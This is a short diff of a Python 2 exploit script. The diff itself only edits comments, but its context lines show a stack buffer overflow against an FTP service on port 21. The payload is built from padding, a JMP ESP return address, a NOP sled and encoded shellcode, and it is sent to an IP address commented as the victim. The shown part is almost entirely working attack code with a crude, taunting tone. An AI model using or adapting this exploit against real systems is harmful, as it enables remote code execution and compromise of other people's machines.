@@ -4,7 +4,7 @@ import socket
 #Version : 1.00
 
 
-# [*] Exact match at offset 246
+# [*] Exact match at offset 246 Bytes
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -39,7 +39,7 @@ shellcode = ("\xb8\x9a\x84\xaf\x01\xdb\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
 
 # shellcode = 351 Bytes
 # 7766AE9F ---> JMP ESP
-Evil=246*"V" + "\x9F\xAE\x66\x77" +140* "\x90" +shellcode               #total shit : 741
+Evil=246*"V" + "\x9F\xAE\x66\x77" +140* "\x90" +shellcode               #total shit : 741 Bytes
 
 print "\nSending the shit........"
 s.connect(("192.168.1.10",21))           #Victim IP address and port.
